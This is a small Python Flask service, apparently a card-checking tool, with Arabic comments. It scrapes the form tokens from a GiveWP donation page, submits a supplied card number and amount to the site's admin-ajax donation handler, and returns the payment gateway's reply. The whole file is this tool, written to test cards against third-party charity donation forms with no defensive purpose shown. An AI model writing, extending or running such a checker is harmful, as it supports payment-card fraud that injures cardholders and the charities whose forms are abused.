from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route("/check", methods=["GET"])
def check():
    url = request.args.get("url")
    card = request.args.get("card")
    amount = request.args.get("amount")

    if not url or not card or not amount:
        return jsonify({"result": "Error: url, card and amount required"})

    try:
        session = requests.Session()

        # 1️⃣ فتح صفحة التبرع
        page = session.get(url, timeout=10).text

        # 2️⃣ استخراج tokens باستخدام BeautifulSoup
        soup = BeautifulSoup(page, "html.parser")
        form_id_tag = soup.find("input", {"name": "give-form-id"})
        form_hash_tag = soup.find("input", {"name": "give-form-hash"})

        if not form_id_tag or not form_hash_tag:
            return jsonify({"result": "Error: tokens not found"})

        form_id = form_id_tag.get("value")
        form_hash = form_hash_tag.get("value")

        # 3️⃣ تجهيز بيانات الدفع
        payload = {
            "action": "give_process_donation",
            "give-form-id": form_id,
            "give-form-hash": form_hash,
            "give-amount": amount,
            "card": card
        }

        # 4️⃣ إرسال POST request للبوابة
        ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"
        resp = session.post(ajax_url, data=payload, timeout=10)

        # 5️⃣ رجع الرد كما هو من البوابة
        return jsonify({"result": resp.text})

    except Exception as e:
        return jsonify({"result": f"Error: {str(e)}"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
